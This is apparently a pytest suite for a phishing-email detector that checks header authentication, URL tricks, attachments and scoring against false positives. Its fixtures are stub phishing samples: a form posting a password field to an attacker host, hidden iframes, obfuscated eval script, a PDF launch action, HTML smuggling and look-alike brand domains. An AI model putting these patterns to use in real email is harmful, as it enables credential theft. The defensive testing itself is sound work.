from pathlib import Path

from detector import analyzer, parser
from detector.checks import urls, attachments, content, headers

SAMPLES = Path(__file__).parent / "samples"


def _ids(result):
    return {i.id for i in result.indicators}


def test_benign_is_low():
    r = analyzer.analyze_file(SAMPLES / "benign.eml")
    assert r.verdict == "low"
    assert r.score == 0


def test_phish_is_high_or_critical():
    r = analyzer.analyze_file(SAMPLES / "phish.eml")
    assert r.verdict in ("high", "critical")


def test_phish_triggers_expected_indicators():
    r = analyzer.analyze_file(SAMPLES / "phish.eml")
    ids = _ids(r)
    assert "spf_fail" in ids
    assert "dmarc_fail" in ids
    assert "dangerous_attachment" in ids
    assert "double_extension" in ids
    assert "ip_url" in ids
    assert "anchor_href_mismatch" in ids
    assert "credential_request" in ids
    assert "urgency_language" in ids
    assert "from_replyto_mismatch" in ids
    assert "suspicious_tld" in ids


def test_anchor_href_mismatch_unit():
    email = parser.parse_text(
        "From: a@x.com\r\nSubject: t\r\nContent-Type: text/html\r\n\r\n"
        '<a href="http://evil.example/login">login at bank.com</a>'
    )
    ids = {i.id for i in urls.run(email, ctx={"brands": {}, "suspicious_tlds": set()})}
    assert "anchor_href_mismatch" in ids


def test_double_extension_unit():
    email = parser.parse_text(
        'From: a@x.com\r\nSubject: t\r\nMIME-Version: 1.0\r\n'
        'Content-Type: multipart/mixed; boundary="b"\r\n\r\n'
        "--b\r\nContent-Type: text/plain\r\n\r\nhi\r\n"
        '--b\r\nContent-Type: application/octet-stream; name="report.pdf.exe"\r\n'
        'Content-Disposition: attachment; filename="report.pdf.exe"\r\n\r\nZZ\r\n--b--\r\n'
    )
    ids = {i.id for i in attachments.run(email)}
    assert "double_extension" in ids
    assert "dangerous_attachment" in ids


def test_offline_makes_no_network_calls():
    # No --online: reputation + live DNS paths must be skipped entirely.
    r = analyzer.analyze_file(SAMPLES / "phish.eml", online=False)
    ids = _ids(r)
    assert "vt_flagged" not in ids
    assert "no_spf_record" not in ids


def test_auth_summary():
    email = parser.parse_file(SAMPLES / "phish.eml")
    a = headers.summary(email)
    assert a["spf"] == "fail"
    assert a["dmarc"] == "fail"
    # content check reachable without diacritic loss
    assert isinstance(content.run(email, ctx=analyzer.build_context()), list)


def test_auth_verify_offline_private_ip():
    from detector.checks import auth_verify
    email = parser.parse_text(
        "Received: from internal ([10.0.0.5])\r\nFrom: a@x.com\r\nSubject: t\r\n\r\nhi"
    )
    ids = {i.id for i in auth_verify.run(email, online=False)}
    assert "private_origin_ip" in ids


def test_auth_verify_online_checks_gated_offline():
    from detector.checks import auth_verify
    email = parser.parse_file(SAMPLES / "phish.eml")
    ids = {i.id for i in auth_verify.run(email, online=False)}
    for online_only in ("no_dmarc_record", "dkim_verify_fail", "spf_live_fail",
                        "dmarc_policy_violation"):
        assert online_only not in ids


# ---------------------------------------------------------------------------
# Tier 2 - attack-vector deep analysis
# ---------------------------------------------------------------------------

def test_html_forensics_unit():
    from detector.checks import html_forensics
    html = (
        '<base href="http://evil.ru/">'
        '<meta http-equiv="refresh" content="0; url=http://phish.tk/go">'
        '<form action="http://collect.evil.ru/x" method="post">'
        '<input type="password"></form>'
        '<iframe src="http://t.ru/x" style="display:none"></iframe>'
        '<div style="display:none">' + ("gizli " * 60) + "</div>"
        '<script>var a=atob("QQ==");eval(unescape("aa"));document.write(a);</script>'
    )
    email = parser.parse_text(
        "From: a@paypal.com.verify.tk\r\nContent-Type: text/html\r\n\r\n" + html
    )
    ids = {i.id for i in html_forensics.run(email, ctx=analyzer.build_context())}
    for want in ("form_external_action", "html_password_input", "meta_refresh_redirect",
                 "hidden_iframe", "base_tag_href", "obfuscated_script", "hidden_text"):
        assert want in ids, want


def test_attachment_deep_unit():
    from email.message import EmailMessage
    from detector.checks import attachment_deep
    m = EmailMessage()
    m["From"] = "a@x.com"
    m["Subject"] = "t"
    m.set_content("hi")
    m.add_attachment(b"%PDF-1.7 /OpenAction<</JS(x)>> /Launch<</F(cmd)>>",
                     maintype="application", subtype="pdf", filename="f.pdf")
    m.add_attachment(b"<script>new Blob([atob('" + b"QUJD" * 80 +
                     b"')]);msSaveOrOpenBlob(x);var l=1;download=1</script>",
                     maintype="text", subtype="html", filename="i.html")
    m.add_attachment(b"PK\x03\x04 word/vbaProject.bin here",
                     maintype="application",
                     subtype="vnd.ms-excel.sheet.macroEnabled.12", filename="b.xlsm")
    email = parser.parse_bytes(m.as_bytes())
    ids = {i.id for i in attachment_deep.run(email)}
    assert "pdf_active_content" in ids
    assert "pdf_launch_action" in ids
    assert "html_smuggling" in ids
    assert "macro_detected" in ids


def test_url_deep_unit():
    from detector.checks import url_deep
    body = "\n".join([
        "http://paypal-secure.com/login",
        "http://paypal.login.account-verify.com/",
        "http://google.com/r?redirect=https%3A%2F%2Fevil.com",
        "http://xkzqvwbfmnrpj.com/",
    ])
    email = parser.parse_text("From: a@x.com\r\nSubject: t\r\n\r\n" + body)
    ids = {i.id for i in url_deep.run(email, ctx=analyzer.build_context())}
    assert "combosquat_domain" in ids
    assert "brand_in_subdomain" in ids
    assert "open_redirect" in ids
    assert "random_host" in ids


def test_url_deep_confusable_idn():
    from email.message import EmailMessage
    from detector.checks import url_deep
    host = "p" + chr(0x0430) + "yp" + chr(0x0430) + "l.com"  # cyrillic a -> paypal
    # A real .eml encodes non-ASCII with a charset, so build it via bytes.
    m = EmailMessage()
    m["From"] = "a@x.com"
    m["Subject"] = "t"
    m.set_content("hi")
    m.add_alternative('<a href="http://' + host + '/login">giris</a>', subtype="html")
    email = parser.parse_bytes(m.as_bytes())
    ids = {i.id for i in url_deep.run(email, ctx=analyzer.build_context())}
    assert "confusable_brand" in ids


def test_qr_graceful_and_judging():
    from detector.checks import qr
    from detector.parser import Attachment
    email = parser.parse_text("From: a@x.com\r\nSubject: t\r\n\r\nhi")
    email.attachments = [Attachment("q.png", "image/png", 6, payload=b"\x89PNG x")]
    # No decode backend (or unreadable image): must not crash, returns a list.
    assert isinstance(qr.run(email, ctx=analyzer.build_context()), list)
    # Judging path: stub decoder with a bare-IP URL -> suspicious.
    orig = qr._decode
    qr._decode = lambda data: ["http://198.51.100.9/login"]
    try:
        ids = {i.id for i in qr.run(email, ctx=analyzer.build_context())}
    finally:
        qr._decode = orig
    assert "qr_suspicious_url" in ids


# ---------------------------------------------------------------------------
# Trust-aware scoring - keep false positives off legitimate mail
# ---------------------------------------------------------------------------

def test_authenticated_newsletter_stays_low():
    from email.message import EmailMessage
    html = (
        "<p>Sayin musteri, kampanyamiz son 24 saat! Hemen inceleyin.</p>"
        '<a href="http://email.brand.com.tr/click?u=x">www.brand.com.tr</a> '
        '<a href="http://e.brand.com.tr/t?redirect=https%3A%2F%2Fbrand.com.tr%2Fs">Kampanya</a>'
    )
    m = EmailMessage()
    m["From"] = "Brand <news@brand.com.tr>"
    m["Reply-To"] = "destek@brand.com.tr"
    m["Subject"] = "Son 24 saat kampanya"
    m["Authentication-Results"] = ("mx; spf=pass smtp.mailfrom=brand.com.tr; "
                                   "dkim=pass header.d=brand.com.tr; dmarc=pass")
    m["Received"] = "from mail.brand.com.tr ([93.184.216.34]) by mx; x"
    m.set_content("Kampanya")
    m.add_alternative(html, subtype="html")
    r = analyzer.analyze(parser.parse_bytes(m.as_bytes()))
    ids = _ids(r)
    # First-party tracker links must not read as spoofing/redirection.
    assert "anchor_href_mismatch" not in ids
    assert "open_redirect" not in ids
    # An authenticated sender with only soft signals stays low.
    assert r.verdict == "low"


def test_auth_level_collapse():
    from detector.scoring import auth_level
    assert auth_level({"spf": "pass", "dkim": "pass", "dmarc": "pass"}) == "pass"
    assert auth_level({"spf": "fail", "dkim": "none", "dmarc": "fail"}) == "fail"
    assert auth_level({"spf": "pass", "dkim": "none", "dmarc": "none"}) == "partial"
    assert auth_level({"spf": "none", "dkim": "none", "dmarc": "none"}) == "none"


def test_soft_signals_alone_never_exceed_low():
    from detector.scoring import score
    from detector.indicators import Indicator
    softs = [
        Indicator("urgency_language", "content", "medium", 12, "e", "x"),
        Indicator("generic_greeting", "content", "low", 4, "e", "x"),
        Indicator("url_shortener", "url", "medium", 8, "e", "x"),
        Indicator("suspicious_tld", "url", "medium", 8, "e", "x"),
        Indicator("excessive_subdomains", "url", "low", 6, "e", "x"),
    ]
    r = score(softs, {"spf": "none", "dkim": "none", "dmarc": "none"})
    assert r.verdict == "low"  # no hard signal -> cannot exceed low


def test_brand_mention_in_body_is_not_impersonation():
    from detector.checks import content
    # Authenticated sender that merely *mentions* a brand in the body.
    email = parser.parse_text(
        "From: Kampanya <news@brand.com.tr>\r\nSubject: teklif\r\n\r\n"
        "PayPal ile odeme yapabilirsiniz. Google hesabinizla giris."
    )
    ctx = {**analyzer.build_context(), "from_rdom": "brand.com.tr", "auth_level": "pass"}
    ids = {i.id for i in content.run(email, ctx=ctx)}
    assert "brand_impersonation" not in ids


def test_brand_impersonation_in_sender_identity_fires():
    from detector.checks import content
    # Display name claims the brand, From domain is unrelated -> impersonation.
    email = parser.parse_text(
        "From: PayPal Security <security@secure-login.tk>\r\nSubject: hesap\r\n\r\nmerhaba"
    )
    ctx = {**analyzer.build_context(), "from_rdom": "secure-login.tk", "auth_level": "fail"}
    ids = {i.id for i in content.run(email, ctx=ctx)}
    assert "brand_impersonation" in ids
